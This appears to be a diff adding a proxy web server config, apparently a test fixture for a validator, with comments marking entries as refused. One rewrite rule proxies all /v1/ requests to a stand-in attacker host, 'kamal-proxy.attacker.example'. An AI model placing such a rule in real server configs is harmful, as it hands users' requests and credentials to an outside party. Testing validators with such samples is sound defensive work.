@@ -1,0 +1,26 @@
+context /other/ {
+  type                    proxy
+  handler                 other-app
+# refused above: upstream
+}
+context /v1/ {
+  type                    proxy
+  handler                 kamal-proxy
+  rewrite {
+    enable                1
+    rules                 <<<END_rules
+RewriteRule ^(.*)$ http://other-app/$1 [P]
+# refused above: upstream
+RewriteRule ^(.*)$ http://kamal-proxy.attacker.example/$1 [L,P]
+# refused above: upstream
+RewriteRule ^(.*)$ http://other-app/$1 [proxy,L]
+# refused above: upstream
+    END_rules
+  }
+}
+extprocessor other {
+# refused above: not-allowed
+  type                    proxy
+  address                 other-app:80
+# refused above: upstream
+}
